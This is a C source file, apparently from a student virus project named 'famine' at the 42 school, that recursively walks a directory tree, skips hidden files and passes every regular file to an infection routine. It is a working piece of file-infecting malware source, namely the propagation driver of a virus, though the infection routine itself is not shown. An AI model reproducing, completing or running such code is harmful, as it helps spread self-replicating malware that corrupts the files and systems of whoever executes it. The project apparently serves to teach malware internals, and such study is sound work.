/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   file_iterator.c                                    :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/06/04 03:37:14 by agrumbac          #+#    #+#             */
/*   Updated: 2019/06/06 04:36:26 by agrumbac         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include <limits.h>
#include "famine.h"
#include "infect.h"
#include "utils.h"
#include "syscall.h"

static void	infect_files_at(char path[PATH_MAX], char *path_end)
{
	struct dirent	*file = NULL;
	int		fd = famine_open(path, O_RDONLY);

	if (fd == -1) return;

	ft_strcpy(path_end++, "/");

	while (famine_getdents64(fd, file, sizeof(*file)) > 0)
	{
		ft_strcpy(path_end, file->d_name);
		if (file->d_name[0] == '.') // we respect your privacy ;)
			continue;
		else if (file->d_type == DT_DIR)
			infect_files_at(path, path_end + ft_strlen(file->d_name));
		else
			infect_if_candidate(path);
	}
	famine_close(fd);
}

inline void		infect_files_in(const char *root_dir)
{
	char	path[PATH_MAX];

	ft_strcpy(path, root_dir);
	infect_files_at(path, path + ft_strlen(root_dir));
}
